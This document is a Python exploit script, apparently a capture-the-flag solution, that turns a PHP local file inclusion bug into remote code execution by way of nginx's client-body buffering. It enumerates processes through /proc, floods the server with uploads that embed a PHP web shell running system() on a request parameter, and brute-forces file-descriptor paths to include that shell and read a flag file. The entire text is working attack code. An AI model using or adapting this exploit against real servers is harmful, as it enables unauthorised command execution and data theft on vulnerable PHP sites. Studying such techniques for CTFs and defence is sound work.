import threading, requests

# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance
# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details

URL = f'http://rce-me2.ctf.actvn.edu.vn:8997/'
x = requests.get(URL).text

# find nginx worker processes 
r  = requests.get(URL, params={
    'l': '/proc/cpuinfo'
})
cpus = r.text.count('processor')

r  = requests.get(URL, params={
    'l': '/proc/sys/kernel/pid_max'
})
print(r.text)
pid_max = int(4194304)
print(f'[*] cpus: {cpus}; pid_max: {pid_max}')

nginx_workers = []
for pid in range(pid_max):
    r  = requests.get(URL, params={
        'l': f'/proc/{pid}/cmdline'
    })

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx worker found: {pid}')

        nginx_workers.append(pid)
        if len(nginx_workers) >= cpus:
            break

done = False

# upload a big client body to force nginx to create a /var/lib/nginx/body/$X

def uploader():
    print('[+] starting uploader')
    while not done:
        requests.get(URL, data="<?php echo(system($_GET['c'])); /*" + 16*1024*'A')

for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()

# brute force nginx's fds to include body files via procfs
# use ../../ to bypass include's readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`

def bruter(pid):
    global done

    while not done:
        print(f'[+] brute loop restarted: {pid}')
        for fd in range(1, 32):
            f = f'/proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
            r  = requests.get(URL, params={'l': f,'c': f'cat flag2_KMACTF_rce_me2_nginx.md'})
            if x != r.text:
                print(f'[!] {f}: {r.text}')
                f = open("lol2.txt", "a")
                f.write(r.text)
                f.close()
                done = True
                exit()

for pid in nginx_workers:
    a = threading.Thread(target=bruter, args=(pid, ))
    a.start()
    
    